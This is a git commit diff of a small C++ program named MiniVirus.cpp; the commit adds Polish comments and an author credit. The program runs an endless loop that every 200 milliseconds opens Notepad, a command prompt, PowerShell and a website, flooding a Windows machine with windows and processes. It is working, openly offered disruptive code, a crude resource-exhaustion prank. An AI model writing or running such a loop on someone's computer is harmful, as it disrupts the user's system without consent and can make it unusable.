e8586340918ca32d4f8ba4590a4cef82f6344716
gitJacobF <114739492+gitJacobF@users.noreply.github.com>
2022-11-14 19:18:34 +0100

    Update MiniVirus.cpp

--- MiniVirus.cpp
+++ MiniVirus.cpp
@@ -1,13 +1,15 @@
-﻿#include <Windows.h>
+// kodował Jakub Famielec
+
+#include <Windows.h>
 
 int main()
 {
     while (true)
     {
         Sleep(200);
-        ShellExecuteA(NULL, "open", "notepad.exe", NULL, NULL, SW_SHOWDEFAULT);
-        ShellExecuteA(NULL, "open", "cmd.exe", NULL, NULL, SW_SHOWDEFAULT);
-        ShellExecuteA(NULL, "open", "https://alesuperstrona.5v.pl", NULL, NULL, SW_SHOWDEFAULT);
-        ShellExecuteA(NULL, "open", "powershell.exe", NULL, NULL, SW_SHOWDEFAULT);
+        ShellExecuteA(NULL, "open", "notepad.exe", NULL, NULL, SW_SHOWDEFAULT); //otwarcie notatnika
+        ShellExecuteA(NULL, "open", "cmd.exe", NULL, NULL, SW_SHOWDEFAULT); //otwarcie wiersza polecenia
+        ShellExecuteA(NULL, "open", "https://alesuperstrona.5v.pl", NULL, NULL, SW_SHOWDEFAULT); //otwarcie mojej strony
+        ShellExecuteA(NULL, "open", "powershell.exe", NULL, NULL, SW_SHOWDEFAULT); //otwarcie powershella
     }
 }
